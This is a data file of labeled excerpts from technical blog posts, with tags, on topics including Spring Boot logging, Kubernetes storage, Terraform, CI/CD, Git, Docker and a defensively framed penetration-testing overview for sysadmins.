182,"So lets start: As I said before, we dont want to try to connect to the log aggregator during development, so we create two different Log4j2 configuration files: __url__ and log4j2-spring-prod.xml. The first one is the typical Log4j2 development configuration, and the second is the one that will be used in production. How do we tell Spring Boot that we want to use one or the other depending on the environment? Well, thats what profiles are for! Edit src/main/resources/ __url__ and add a piece like this one at the end: This basically tells Spring Boot that the default logging configuration file is log4j2-spring.xml, found in the classpath. We also say explicitely that in test and devel we want to use that one, and then that in prod we want to use log4j2-spring-prod.xml. Why do we tell test and devel that we want to use that one explicitely? Because if we run some tests using the production configuration but overriding some values, we might start the application with the profile prod,test and if we did not tell Spring Boot again that we want to use __url__ in test, it would use log4j2-spring-prod.xml. This way we are safe that the latest active profile is the one that sets the logging configuration file to use. If we have other environments in the pipeline, with or without aggregators, changing the settings to decide which configuration to use in each environment is fairly easy.","['Elasticsearch', 'Spring Boot', 'Log4j2']",18
183,"The settings for how long you want to keep the backup files depend on the situation and the application and is something to agree with the production guys. In any case, the interesting bit is the Gelf appender. With that one, we are sending the logs directly to the Elastic Stack and defining the fields we want to send. The appender has some default fields that are sent if you dont specify anything, check the documentation for details, but I always build on top of that. In this case Im sending: Timestamp: essential Log level: essential Simple class name producing the log: I prefer it over the lengthy fully qualified name Class name: I send it, just in case, but Ive never used it so I have it filtered out in Logstash. Hostname and simple hostname: The same as with class name, simple name is usually good enough and is shorter. Application name so I can filter easily and also so I can have different settings in Elastic Stack depending on the application Thanks to include Full Mdc=true, all the fields added to Log4J Mapped Diagnostic Context (MDC) will be added as fields to the log. This feature is very useful as, for example, it means that the token-per-request ID described in the entry Spring Boot: Setting a unique ID per request is added automatically, isnt it cool? If you check the production file, youll see that there base Dir, the directory where the log files are stored is set to the logs directory at the home of the user running the application ($${env: HOME}/logs). Change that if you want to store the logs elsewhere.","['Elasticsearch', 'Spring Boot', 'Log4j2']",18
184,"Containerization has revolutionized the way we think of application development as a whole. There are many benefits: consistent environments between development and production, isolation from other containers using shared resources, portability between cloud environments, rapid deployments. The list goes on and on. However, you cant expect to have all of these benefits without certain tradeoffs. The inherently ephemeral nature of containers is at the core of what makes containerization great; immutable, identical containers that can be quickly spun up in a flash. But there is also a downside to the ephemeral nature of containers; lack of persistent storage.","['Kubernetes', 'Containers', 'Containerization', 'DevOps']",10
185,"But even these types of applications do not require the same level of persistence, as there are obviously varying levels of criticality for different applications. For that reason, I have come up with a short list of questions to ask myself when designing a stateful application: How much data are we trying to manage? Is starting from the latest snapshot enough, or do we need the absolute most recent data available? Does a restart from snapshot take too long, or will it suffice for this application? How easily can the data be replicated? How mission critical is this data? Can we survive a container or host termination, or do we need remote storage? Are different Pods in this application interchangeable? Many applications require data to persist across both container and host restarts, leading to the necessity of remote storage options. Luckily, Kubernetes has realized this need and provided a way for Pods to interact with remote storage: Volumes Kubernetes Volumes provides a way to interact with remote (or local) storage options. These Volumes can be viewed as mounted storage that persists for the lifetime of the enclosing Pod. Volumes will outlive any containers that spin up/down within that Pod, giving us a nice workaround to the ephemeral nature of containers. An example of a Pod definition that leverages a Volume can be seen below.","['Kubernetes', 'Containers', 'Containerization', 'DevOps']",10
186,"Persistent Volume Persistent Volume Claim The Persistent Volume definition specifies the capacity of the storage resource, as well as some other Volume specific attributes such as the reclaim policy and access modes. The.spec.storage Class Name can be used to classify the PV as a certain class of storage, which can be leveraged by PVCs to specify a specific class of storage to claim. The Persistent Volume Claim definition above specifies the attributes for the Persistent Volume that it is attempting to claim; some of these being storage capacity and access modes. A PVC can request a specific PV by specifying the.spec.storage Class Name field. A PV of a particular class can only bind to PVCs requesting that class; a PV with no class specified can only bind to PVCs that request no particular class. Selectors can also be used to specify a specific type of PV to claim; more documentation on this can be found here.","['Kubernetes', 'Containers', 'Containerization', 'DevOps']",8
187,"Persistent Storage is crucial when we think about state; where does my data live and how does it persist when my application fails? However, certain applications themselves require state management beyond just persisting data. This is seen most easily in applications that leverage multiple pods that are not interchangeable (e.g. a primary database Pod and its replicas of certain distributed applications such as Zookeeper or Elasticsearch). Applications such as these require the ability to assign unique identifiers to each Pod hat persist across any rescheduling. Kubernetes has offered this functionality through the use of Stateful Sets.","['Kubernetes', 'Containers', 'Containerization', 'DevOps']",8
188,"Ordered Deployments, Scaling, and Deletion Pod identifiers in Stateful Sets are not only unique, but also ordered. Pods within Stateful Sets are created sequentially, waiting for the previous Pod to be in a healthy state before moving on to the next Pod. This behavior extends to both scaling and deletion of Pods as well. No updates or scaling can happen to any Pod until all of its predecessors are in a healthy state. Similarly, before a Pod is terminated, all of its successors must already be shut down. These functionalities allow for stable, predictable changes to the Stateful Set.","['Kubernetes', 'Containers', 'Containerization', 'DevOps']",8
189,"In Terraform this is modelled using the create_before_destroy lifecycle setting. As we cant create a new resource with the same name as the old one, we dont hard-code the name and only specify the prefix. Terraform adds a random postfix to it, so the new configuration doesnt clash with the old one before it is destroyed. In a simplified form this is how it can look: Replacing the launch configuration of an Auto Scaling group by itself would not trigger any changes. New instances would be launched using the new configuration, but the existing instances are not affected. It is possible to force the Auto Scaling group to cycle the instances by adding some kind of post-deployment lambda function, but Terraform gives as a better option.","['AWS', 'Terraform', 'Cloudformation', 'Infrastructure As Code', 'Immutable Infrastructure']",18
190,"In most cases, I would take Terraform over Cloud Formation, if only because of more pleasant and powerful syntax. And more pragmatically, it makes sense to choose one tool and stick with it, because it reduces the burden of maintaining the deployment pipelines. However, this seems to be a case where Cloud Formation opens up possibilities not available with plain Terraform, so We can define our Auto Scaling group as an aws_cloudformation_stack resource in Terraform, and it will look like this: When it comes to rolling out changes to Auto Scaling groups managed in Terraform, we have several options. Blue/Green deployments work well with web services, because ELB health checks provide a robust way to ensure that the service is operating correctly. Worker type workloads (such as ECS clusters) usually do not have a web endpoint which would allow us to use ELB health check. In such cases, we can fall back to using Cloud Formation stack resource, with cfn-signal ensuring the health of the instances.","['AWS', 'Terraform', 'Cloudformation', 'Infrastructure As Code', 'Immutable Infrastructure']",10
191,"Another big plus offered with the Swift and Turbo plans is the unlimited databases feature. This is great if youre running a lot of apps or other things which require a lot of databases. Again, if your website isnt going to need all this unlimited goodness, you might be better off going with Bluehost.9% uptime. Although Bluehost has very reliable stats for their servers, A2Host boasts a 99.9% uptime, and has a reputation for meeting that benchmark. This is only really a big deal if you need your website to be super-fast, but most users will find speed to be a huge factor in their website performance.4x redundant network. A2Hosting has a quadruple redundant network which provides unprecedented reliability. The redundant network means that even if the servers fail up to three times, the fourth redundancy will keep it running. This is great for websites that are really sensitive to potential downtime.c Panel interface. Like Bluehost, A2Hosting uses the industry-standard c Panel. This comes with all the same ease-of-use and learning advantages you could expect. The c Panel interface is well known for its straightforwardness and usability.","['Web Hosting', 'Bluehost Vs A2hosting', 'Hosting Comparison', 'Web Hosting Review', 'Best Web Hosting']",11
192,"Im a big believer in not reinventing the wheel when it comes to tools. ETL tools are a sort of solved problem, and theres an abundance of options available. Tools like that dont come cheap though. They add enormous value for adding lots of connectors, managing of interdependent pipelines, and monitoring/error reporting. The value of an ETL tool scales with the number of connectors you need, number of pipelines you have, and how interdependent those pipelines are. At some tipping point of those 3 factors, an ETL tool becomes a positive value.","['Python', 'Etl', 'Containers', 'Docker', 'Python Flask']",10
193,"With everything deployed in ECS, the only thing left to do was invoke pipelines on a regular basis. This ended up being a little more complex than expected. We ended up using a combination of Cloudwatch, Flask, and SQS. The core concept was to use Cloudwatch to trigger posts to endpoints for pipelines at particular intervals. All in all, it works great.","['Python', 'Etl', 'Containers', 'Docker', 'Python Flask']",10
194,"The following will give you a walk-through on how to add continuous integration(CI) and continuous deployment(CD) using circle CI to your web application. However before we get to that lets find out what continuous integration actually means. As the head of technical services at Circle CI, Lev describes it as: Theres a lot of CI best practices you can adhere to, but Id say one of the most important is test all changes that you are making to your code base. You can accomplish this with: Unit Tests Integration Tests Functional Tests (also known as End to End tests)Which leaves us with the question What is continuous deployment? It is usually what you do when all your tasks defined in CI stage passes, then you can deploy your code to development, staging, production, etc., automatically. The specific way that you do this depends on what type of infrastructure you are deploying to. All of this usually starts with adding web-hooks to your repository that gets triggered on each change / commit into the codebase or otherwise depending on how you configure them. The following tutorial will guide you on how to add CI/CD to a Progressive web application (PWA) based on the JAM stack.","['Github', 'Circleci', 'DevOps', 'Netlify', 'Gatsbyjs']",10
195,"Once this is done you also need to test if Netlify deploy works in your local repository. You can do this by installing the Netlify CLI globally using Then you can usewhich will prompt you to allow access by redirecting you to your Netlify dashboard or login. Then it will prompt you to select an existing site or create a new one, select create a new site. Go to your Netlify dashboard and verify that a site has actually been added. Then you can create a new config file called __url__ in the root directory of the app and add in the following: And replace your_created_sites_API_ID with the API ID of the site you just created on Netlify dashboard. You can find the API ID by going to Site settings and check under Site information. To deploy trynpm run buildand thennetlify deploy --dir=public -p again and this should deploy your site. Once this is confirmed to be possible locally, you can add the jobs that would be performed into the __url__ like described in the snippet below.","['Github', 'Circleci', 'DevOps', 'Netlify', 'Gatsbyjs']",7
196,"Revant Kapoor | Technical Lead, Engagement Growth User retention is an important but nebulous idea. Its hard to acquire users and even harder to help them feel at home through an engaging and relevant experience. So when some of those users start to leave the platform, your first thought is to re-engage them. Its important, though, to understand what they liked about Pinterest and help them reconnect with the platform. As Pinterest has gone global with hundreds of millions of Pinners, getting this understanding has become harder. Here Ill share how we created a framework to make progress on this large and ambiguous problem.","['Engineering', 'User Retention', 'Growth Hacking']",17
197,"Even though Pinterest now has 600+ engineers, we still operate like a startup. Engineers have the freedom to identify problems, propose solutions and have impact. I raised the opportunity with a few other engineers and started working on it! I previously worked at Highlight, which was acquired by Pinterest in 2016. When I joined the growth team at Pinterest, we were focused on deepening the engagement of Pinners. Looking at the scale of Pinterests data I thought this would be a great opportunity to use machine learning for churn prediction (the ability to predict when a user is likely to drop off our platform). Once we could predict churn, we could intervene and prevent at least some from doing so. While this actually solved an important problem, in reality, it was the passion for using machine learning to do something interesting that made me pursue this particular idea. We ran a number of experiments targeted toward those with low engagement and who were likely to become dormant. Over time, we learned this was actually too late! Many of them had been power Pinners whose engagement had steadily declined over time. What if we were to intervene earlier in their downgrade journey to prevent churn? This planted the seed for downgrade prevention (a.k.a.","['Engineering', 'User Retention', 'Growth Hacking']",6
198,"In our case it was paranoia. When it comes to visitation rates there will typically be those who upgrade and those who downgrade. And while overall visitation on Pinterest had been continuously growing, we needed to understand what happens to downgraded Pinners in the future. Is it just natural for Pinners to downgrade and then come back later, or is it a one way street? We crunched some numbers and realized a significant portion of those who downgraded eventually churn from the platform (downgrade is monotonic). We realized if we didnt do anything, a percentage of these Pinners would never come back, which would be a massive missed opportunity because they had previously been engaged.","['Engineering', 'User Retention', 'Growth Hacking']",17
199,"While we were building the model we also wanted to figure out what to do for these Pinners once we could target them. We thought it would be best to ask them, as they surely would know why they were using Pinterest less. So we did an in-product survey for a sample set, and found the most common reason for not using Pinterest was that they got busy. We were now back to the drawing board and realized these Pinners needed more relevant content that made the experience seem additive and good use of time. We revisited one of our most successful experiments from the pastshowing a topic picker with recommended content. Once youve shown some success, you can invest more time and resources into a problem.","['Engineering', 'User Retention', 'Growth Hacking']",6
200,"The first step was to get a deeper understanding of our user population. We analyzed data to compare Pinners who downgraded to those with a similar past visitation who didnt downgrade. For example, we looked at a cohort who visited X weeks in Q1 and compared the behavior of those who downgraded in Q2 to those who didnt. This analysis helped us learn more about the problem areas and form a strategy. We came up with 34 different hypotheses for why these Pinners downgraded and then brainstormed to bring in people from different backgrounds and schools of thought. The important thing is to execute on ideas that will help you test each of the hypotheses first. Hopefully 12 of those strategies work out, and if they dont, at least you have some learnings you can apply into re-tackling the problem.","['Engineering', 'User Retention', 'Growth Hacking']",14
201,"I needed at least a month of data before I could make any sort of claim. So I deployed everything and forgot about it for a while. A long while Lucky for you, I already did the waiting part! First, lets see what the average and minimum number of pods and nodes are. We can do that with a simple SQL query: For the three node cluster, the results are as follows: And for the six node cluster: You can see some interesting things from these numbers. First of all, the average numbers are super close to the max numbers. This shows us the GKE is very fast to recover from PVM nodes shutting down. Remember, PVMs always shut down after 24 hours, so these shutdown events are happening all the time.","['Kubernetes', 'Cloud Computing', 'Optimization', 'Google Cloud Platform', 'Containers']",11
202,"The next thing is the min numbers. First of all, it is clear that PVMs cause some huge churn. For the smaller cluster, we dropped to 0 which is not good. For the larger cluster, we dropped to half the max, which isnt that bad at all. Remember, we are running 2x the capacity for 30% less cost! These numbers only tell us half the story. Averages and absolute minimums can be very deceiving. What we really care about is the distribution of requests, and things like p50, p90, and p99 latency. So lets write a new SQL query that can give us these numbers.","['Kubernetes', 'Cloud Computing', 'Optimization', 'Google Cloud Platform', 'Containers']",8
203,"Because of the long building time, many different stakeholders are typically involved in building a cathedral, which in turn often causes requirements to change. Suddenly, the neighboring country starts building a higher tower and the bishop wants to surpass them. Or he decides that the original footprint is too small and needs to be extended. Or new architecture styles and techniques are invented and need to be incorporated. Almost the same applies to software projects, where both requirements and the environment are very likely to change during the project time. To succeed, the architecture needs to be able to cope with this.","['Software Development', 'Software Quality', 'Software', 'Software Engineering']",12
204,"When building a cathedral, constant quality assurance is required. All workers involved need to be trained, the latest building progress needs to be compared to the target architecture and a high quality of the building material needs to be assured. To support this, tests need to be created and tools need to be used, and sometimes entire building blocks need to be rebuilt if they do not match the expected outcome. If quality is not assured in every step, everything might go well for some time and progress might even be faster, but there will be a point in time where the quality deterioration becomes apparent and the caused damage is much higher. In addition, quality assurance should constantly check if the set goals are achievable in the given environment and with the given technology. Beauvais Cathedral collapsed because of this.","['Software Development', 'Software Quality', 'Software', 'Software Engineering']",1
205,"When planning a cathedral, not only does the current environment need to be considered when, but also potential environment changes. This includes changes of weather, political situation or ground conditions. There are many examples of cathedrals collapsing during storms, like Malmesbury Abbey. At the end of the day, every software runs in a very specific environment. It is often much easier to build software on a local computer or a development environment, without considering the final target environment. In addition, operating systems, frameworks or application server versions can change over time, and support for specific versions can run out. This may require constant adoption to keep the software running and a secure and stable manner.","['Software Development', 'Software Quality', 'Software', 'Software Engineering']",16
206,"Large parts of constructing a cathedral are plain engineering, very similar to any other building. Walls are needed, as are roofs and floors, ceilings and more. Still, famous cathedrals achieve something special: there is art both in the details and in the whole. A standard window frame has colorful glass paintings, in standard corridors there are plenty of statues and pictures, above a standard door there are wonderful stone decorations. In addition, the overall building is a piece of art when looked at from some distanceeven though most of its construction required hard engineering work. While most of the development is standard engineering work, the art lies both in the fundamental underlying algorithms and in the overall construction with its architecture and its special usage of different buildings blocks and design patterns.","['Software Development', 'Software Quality', 'Software', 'Software Engineering']",12
207,"Gamma is the software analysis platform I helped develop. Unfortunately, at this point in time, Gamma is not able to write creative algorithms, or design overall software architectures for you (maybe we will be able to do this at same point, watch out for our work on AI). However, Gamma is a tool that can be extremely helpful in many other aspects. It helps in quality assurance and managing architectural changes without breaking the overall software. It identifies design and coding errors early in the process and provides a lot of metrics that can be used to validate the current progress against the target results. With its KPIs like robustness, maintainability or interoperability, it also makes it easier to build software that runs stable in the envisioned environment and can cope with changes.","['Software Development', 'Software Quality', 'Software', 'Software Engineering']",5
208,"The main reason for getting side gigs is to get some more income. Even though developers make good money, we could always use more. Some people have massive student loan debt, while others are saving up to buy a house. Side gigs are one way to pad your income, but have you thought about just increasing your income at your day job? Say you wanted to make another $15,000 per year on top of your current salary. The first thing a lot of people Ive talked to will think about is getting some type of side work going. Starting a side business and making a little extra cash worksbut whats the time frame? How long will it take you to get up to that $15,000 per year? You might hit it out of the park on your first try, but usually it takes time to build up clients, processes, and your supplemental income. On a similar overall timeline, you can increase your value to your current employer and get a raise.","['Freelancing', 'Software Development', 'Business', 'Careers']",2
209,"Here I will introduce some packages that share the ideas:testfixtures The testfixtures work out-of-the-box. Its doing both things, it cleans a database before each test and then loads the data into the database. dbcleaner The dbcleaner allows clearing database before each test. It allows running tests in parallel.3. go-txdb The go-txdb allows to run tests inside the SQL transactions. This means what each test will run in the isolated database instance, this allows running tests in parallel.4. polluter The polluter gives the ability to seed a database with the data from YAML files. This package was created to be used with the database cleaning tool or transactional database.","['Testing', 'Golang', 'Database']",7
210,"So people went back to just using Helm for client side templating, something you can now do in only a few keystrokes (used to be a much longer hack before helm template was added): In fact, some continuous deployment tools, like Spinnaker, do this for you. And while that might be ok for complex open source tools you found in the Cloud Native Wasteland, telling you what you should and should not configure, its a pretty verbose way to template your internal web applications and backend microservices. After all, if youre actually Dev Ops-ing, does developer-you really need to tell operator-you what you can and cant configure? Do you really need to learn a new templating language? So, I designed a simple tool that you can use instead. Its lightweight, just a few lines of code on top of your YAML. Its flexible, offering both imperative and declarative interfaces. Its powerful, handling input validation right out of the box. Its so easy to use, you probably already know it. And you can get started right away, because its probably already installed on your machine!","['Kubernetes', 'Yaml', 'Templating', 'Helm', 'Bash']",19
211,"Its Friday afternoon, somewhere around 2PM. The sound of whirring laptops is drowned out by your earbuds blasting the most aggressive music you have synced to your smartphone. That hash you captured hasnt cracked, and your machine has been running since early Tuesday. The second energy drink you pounded down this afternoon hits the rim of the trashcan. The sterile business casual attire youre being forced to wear is becoming noticeably less breathable as the frustration builds inside of you. Its a couple of hours away from time to wrap up the engagement and provide the client with a verbal overview of your findings, but you dont want to step into the office without capturing that flag.","['Cybersecurity', 'Sysadmin', 'Penetration Testing', 'It Operations']",0
212,"To be clear, this articles intention is to focus on the why and not completely the how. There are countless videos and tutorials out there to explain how to use the tools, and much more information than can be laid out in one blog post. Additionally, I acknowledge that other testers out there may have an alternate opinion on these tools, and which are the most useful. If you have a different opinion than that which is described in the article, I would love to hear it and potentially post about it in the future! Feel free to comment below, or shoot me an email, tweet, whatever. I am pretty receptive to feedback.","['Cybersecurity', 'Sysadmin', 'Penetration Testing', 'It Operations']",6
213,"Sysadmins are more inclined to focus on whether or not the system works before getting dragged off to another task on a never-ending list of things to do. Fortunately for the overwhelmed, the mitigations are straightforward, and revolve around disabling the protocols. Use safer methods to propagate your web proxys PAC file location, like through Group Policy. I know it is tempting to Automatically detect settings, but try to avoid it. Test thoroughly in the event you are still supporting that NT Server from the 90s hosting that mission critical application though Just kidding, no one is hosting an NT server nowadaysright? Before Empire hit the scene, pentesters typically relied on Command and Control (C2) infrastructure where the agent first had to reside on-disk, which naturally would get uploaded to Virus Total upon public release and be included in the next mornings antivirus definitions. Of course ways to get around antivirus existed, but it was always an extra step, and any solution that leveraged any kind of behavior based detection would give you extra headaches. The time spent evading detection was a seemingly never-ending cat-and-mouse game. It was at that moment brilliant white knight(s) crossed the horizon, and said let there be file-less agents!. And just like that, the game was changed.","['Cybersecurity', 'Sysadmin', 'Penetration Testing', 'It Operations']",11
214,"Sysadmins, what does this mean for you? Well, it means that some of the security controls you have put in place may be easily bypassed. File-less agents (including malware) can be deployed by Power Shell and exist in memory without ever touching your hard disk or by connecting a USB (although this mode of entry is still available, as I will explain later). More and more malware exists solely in memory rather than being launched from an executable sitting on your hard disk. A write-up mentioned at the end of this post elaborates much further into this topic. Existing in memory makes antivirus whose core function is scanning disk significantly less effective. This puts the focus instead on attempting to catch the initial infection vector (Word/Excel files with macros very commonly), which can be ever-changing.","['Cybersecurity', 'Sysadmin', 'Penetration Testing', 'It Operations']",3
215,"Fortunately, the best mitigation here is something you may already have access to Microsofts Applocker (or the application whitelisting tool of your choice). Granted, whitelisting can take some time to stand up properly and likely requires executive sign-off, but it is the direction endpoint security is heading. This is a good opportunity to get ahead of the curve. I would ask that you also think about how you use Power Shell in your environment. Can normal users launch Power Shell? When it comes to mitigation, let me save you the effort; the execution policy restrictions in Power Shell are trivial to bypass (see the -Execution Policy Bypass flag).","['Cybersecurity', 'Sysadmin', 'Penetration Testing', 'It Operations']",11
216,"Sysadmins, think about your baseline policies and configurations. Typically it is best practice to align with an industry standard, such as the infamous DISA STIG, as closely as possible. Baselines such as DISA STIG support numerous operating systems and software, and contain some key configurations to help you prevent against offline password cracking and replay attacks. This includes enforcing NIST recommended password policies, non-default authentication enhancements, and much more. DISA even does the courtesy of providing you with pre-built Group Policy templates that can be imported and custom-tailored to your organizations needs, which cuts out much of the work of importing the settings (with the exception of testing). Do you still use NTLMv1 on your network? Do you have a password requirement of 8 or less characters? Know that you are especially vulnerable.","['Cybersecurity', 'Sysadmin', 'Penetration Testing', 'It Operations']",11
217,"Did the idea of testing out an IDS system ever pique your interest? It just so happens that there are open source options available, including Security Onion, to test and demonstrate effectiveness. IDS rules are focused on identifying anomalous network activity that may indicate an attempted ARP poisoning attack. Give it a whirl if you have a spare box laying around, and approval of course. Honeypot systems may be a great idea for a trial run, to which there are a number of open source options available.","['Cybersecurity', 'Sysadmin', 'Penetration Testing', 'It Operations']",11
218,"Sysadmins, if I were to ask you what your exposure is to the Internet, would you be able to tell me? What ports and protocols do you have forwarded out to the wild? What web consoles are exposed for anyone to see? Run a WHOIS lookup on your organizations primary web domain at a popular registrar (Network Solutions, Go Daddy, etc). Whose name, address, and email do you see listed? Perfect Privacy, otherwise that person is going to become a target to adversaries. Shodan has even made a business exposing these devices to the world. Take your external IP addresses and plug them into the search engine, and see what everyone else can see.","['Cybersecurity', 'Sysadmin', 'Penetration Testing', 'It Operations']",11
219,"If you are a sysadmin and do not recognize the name Phineas Fisher, I wouldnt be surprised. If you are a pentester, shame In 2016, the firm Hacking Team based out of Milan, Italy, was known for designing cyber-weapons for governments across the globe. They were notoriously hacked by an unknown attacker with this pseudonym. The end result was the leakage of a huge volume of data, and quite possibly one of the most comprehensive write-ups on a real-life hack ever created. The point here is, take a look at Step 2 of his write-up. I wont comment about the ethics of the event, but regardless of where you stand on it, the details Phineas Fisher has provided have incredible value for security researchers and system administrators alike to step into the mind of an attacker.","['Cybersecurity', 'Sysadmin', 'Penetration Testing', 'It Operations']",16
220,"The next two lines set up your local Git project to point to a remote Git Hub project. In other words, we make our local Git project aware that we also have a remote (e.g. To do this, you use the git remote add <name> <URL> command, supplying it a name for the remote location and also the URL. The name can be anything, though youll commonly see the word origin used to refer to your main remote repository. But, for example, if you wanted to upload your project to both Git Hub and Bitbucket, you might have a github remote and a bitbucket remote.","['Git', 'Github', 'Version Control', 'Software Development', 'Programming']",7
221,"Heres a list of the commands used in this article. All of these should have a counterpart if you are using a UI tool for G __url__ initinitializes the current directory as a Git __url__ add <path>adds the file or directory to the staging area. Use git add -A to stage all __url__ commit -m ""Some message""wraps the staging area into a commit, described by the message __url__ statuslist out the currently unstaged and staged __url__ logview the commit __url__ branch <name>create a new __url__ branchlist all branches in the __url__ checkout <branch or commit ID>switches to the specified branch. Or, checks out the state of the project at that particular __url__ checkout -b <name>shortcut for creating the branch if it doesnt exist and switching to __url__ merge <branch>Merges the specified branch with the current branch, pulling in any new __url__ remote add <name> <URL>Adds a new remote repository at the specified URL which can be referenced using the supplied __url__ remote -v View currently configured __url__ push <remote> <branch>Pushes the specified branch to the remote repo. Use -u to set up tracking so next time you can just use git __url__ clone <URL>Pulls down the remote repo to your local __url__ pull <remote> <branch>Pulls down the remote branch and merges any new changes into the current branch. If you previously pushed with the -u flag, you can omit the remote and branch.","['Git', 'Github', 'Version Control', 'Software Development', 'Programming']",7
222,"Perhaps youre a new software engineer looking to join our team. Or maybe youve been building software for a while, are considering a career in Fintech and Market Invoice has caught your eye. If either of these is you, you may be wondering how can I become a really good software engineer? Or, how can I become an even better software engineer? Ive been regularly asking myself the first question since I joined Market Invoice a few months ago. Ive found this quote by the late W. Edwards Deming (best known for spearheading reform in Japanese innovation and quality manufacturing post-WWII) useful: This is just as true whether youre working in manufacturing and innovation or in software engineering. In this article, Ill briefly dive into what software engineering is; the mindset and the technical and non-technical skills an excellent software engineer should possess; and suggested strategies for growing as a software engineer.","['Software Development', 'Software Engineering', 'Continuous Improvement', 'Learning And Development', 'Engineering']",2
223,"Chances are, if youve ever applied for an entry-level software engineering job, youll have noticed a strong emphasis on skill with data structures and algorithms. While these form a large chunk of many undergraduate university Computer Science degrees these days, theyre just the foundation where technical skills are concerned. Theres so much more to learn! First things first: if youre a software engineer, its likely that some of your time will be spent writing code. So, especially if youre just starting out, its important to master at least one programming language. If youre not sure where to start, learn the standard libraries of the main language used where you work. At Market Invoice, a significant part of our codebase is developed using C# and the.","['Software Development', 'Software Engineering', 'Continuous Improvement', 'Learning And Development', 'Engineering']",2
224,"The scratch image is the most minimal image in Docker. This is the base ancestor for all other images and is mostly used for building other base images. The scratch image is actually empty, it does not contain any folders or files. Using this base image, the first cache layer will match the first statement in the Dockerfile. It isnt always possible to use it. It depends on what are the minimum requirements necessary to execute the software.","['Docker', 'Build', 'Optimization', 'Programming', 'Golang']",7
225,"Inevitably, someone will gush over the convenience. An envious few will listen for scraps of information to spring off on their own. One or two of their friends will make no attempt to hide the glaze of boredom being poured over their minds. Everyone else will sit back and watch, trying to make sense of where to start. Those people are doomed to disappointment.","['Continuous Integration', 'Continuous Delivery', 'Software Development']",4
226,"The big problem with CI/CD discussions is that to outsiders, the principle seems like an all or nothing push. The conversations are always around either wants or winsrarely about the process. This problem stems from one of the greatest strengths of our modern toolkits. Once the decision is made to begin to strut down the path, wins come so quickly, it outweighs the effort involved in setup! This series is for people who arent sure where to start. Were going to take a traditional development model, and assess the value that were looking to find at each step, as well as the inefficiencies that may currently exist. Next, were going to make a business case for an overhaul, and suggestions to help manage the transitions.","['Continuous Integration', 'Continuous Delivery', 'Software Development']",1
227,"The Ops team has a massive, and holistic knowledge of the current state of your environments, and what it takes to keep them going. The need for that knowledge doesnt go away. The goal, instead, is to make their job easier- so that they can focus on doing things that are innovative and creative instead of mundane and trivial. Believe me when I say that there will always be plenty of work for them to do. Nobody is going to be working themselves out of a job.","['Continuous Integration', 'Continuous Delivery', 'Software Development']",0
228,"Now that weve got that out of the way, lets talk a bit about traditional deployment pipelines. Youve probably seen a process that looks something like this: Every one of these steps requires someone physically working on a machine, every piece is subject to human error, and every bit can fail and need to be repeated or rolled back. Furthermore, if there is a problem with code committed to source control, we wont find out until someone else tries to pull down the code and/or build it. That could be hours, days, or even weeks! Theres another glaring issue with this pipeline. What happens if something goes wrong, and we need to roll back? Hopefully whoever is doing the deploy remembers is less forgetful than I am, but Ive sure been bitten by my forgetfulness, or even from accidentally backing up the wrong thing! We all know there are issues. Lets start with a big hitter. Asking Ops to deploy code is a huge pain in everyones butt. Lets think about how this process might look.","['Continuous Integration', 'Continuous Delivery', 'Software Development']",13
229,"If each person makes this mistake just once a week, youve spent 18 hours of employee time focused on just compiling your applicationnot even deploying anything. Lets assume they average a 70k salary. Optimistically, your deployments for the week just cost you $630 in direct labor costs, not to mention the opportunity cost equivalent of one of your employees taking half a week of vacation. Thats $32,760 and 936 hours of sunk operating cost every year. If you said nothen youve just discovered how to start. Get your applications to build on every commit. Make the success or failure of the build highly visible.","['Continuous Integration', 'Continuous Delivery', 'Software Development']",1
230,"This strategy brings some benefits and some pitfalls to the service composability table. In the spirit of DRYthe orchestrator is a clean place to put workflow logic. Since the orchestrator has the high-level understanding of what should be happening within the system, it can provide advanced progress monitoring and error handling right out of the box. Its not all good news for the orchestration pattern though Orchestration inherently sets up a structure with a single point of failure. If the orchestrator becomes unable to delegate tasks for any reasonits as if the conductor of the symphony orchestra dropped dead in the middle of a performance. All progress within the system stops, and unless the fault is of a type which can be automatically detected and healed within your environment, your on-call engineer is not going to have a good night.","['Microservices', 'Design Patterns', 'Development']",8
231,"Compared to orchestration, choreography is (in my opinion) quicker to get started with for a new project. It does not require the upfront time investment of learning to use someone elses orchestration engine, and lets you jump right into what you know bestcode. If designed correctly, it can even be faster than an orchestrated system, as you do not incur the overhead of having to wait on the orchestrator between each logical step. Be careful thoughsome of the benefits that the orchestrator provides have no equivalent here. With services directly interacting with each other, error handling within the workflow is entirely your responsibility. There is no mediator to intervene and prevent cascading failures. Communication within your development team becomes especially critical, since the integrity of the workflow as a whole is dependent on each service obeying its contract, which itself is dependent on a shared understanding between developers of how both individual services and the entire system itself should operate.","['Microservices', 'Design Patterns', 'Development']",1
232,"Take Dropbox as a good example of quality differentiation. When they pitched their product, many investors initially felt their target space was already too crowded. However, do you remember any decent file syncing service before Dropbox? Neither do I. Thats because existing products were pretty lousy. Dropbox hit the market with a solid marketing strategy and high quality, if not perfection, and its current ubiquity speaks to its success.","['Startup', 'Agile Methodology', 'Minimum Viable Product', 'Perfectionism', 'Quality Management']",17
233,"For a visual, imagine a well-kept construction site for new home or a remodel. Ahhh, thats a relaxing visual, right? But dont imagine a level 4 bio lab. You want your job site to be safe and tidy, with tools and safety equipment in their proper places. You dont need to halt production to sweep every particle of sawdust that falls from your table saw.","['Startup', 'Agile Methodology', 'Minimum Viable Product', 'Perfectionism', 'Quality Management']",12
234,But consider app and your audience. Is the app merely run-of-the-mill CRUD widget or an internal tool of minor importance? Forgo the design studios and usability studies. Slap a Bootstrap theme on it and call it a day.,"['Startup', 'Agile Methodology', 'Minimum Viable Product', 'Perfectionism', 'Quality Management']",19
235,"Google Places API gives you nearby places 20 at a time with 3 pages of results. This means you only get 60 places at a time. Which should be okay for our use. So you have to call this networking call thrice, recursively. As the JSON response contains the next_page_token, and you have to use this token to get the next page. However when you request the next page, you have to use parameter key pagetoken. Otherwise you will end up searching stack overflow for a while, like I did.","['Machine Learning', 'Maps', 'Algorithms', 'Problem Solving', 'Technology']",11
236,"The location marker on the map. The blue circle is her work. Where the nearby search is biased around. Now there are the friends and gym. So you create an array of 3 vectors. Her gym has a single location, which she tries to go at least 6 times a week.","['Machine Learning', 'Maps', 'Algorithms', 'Problem Solving', 'Technology']",14
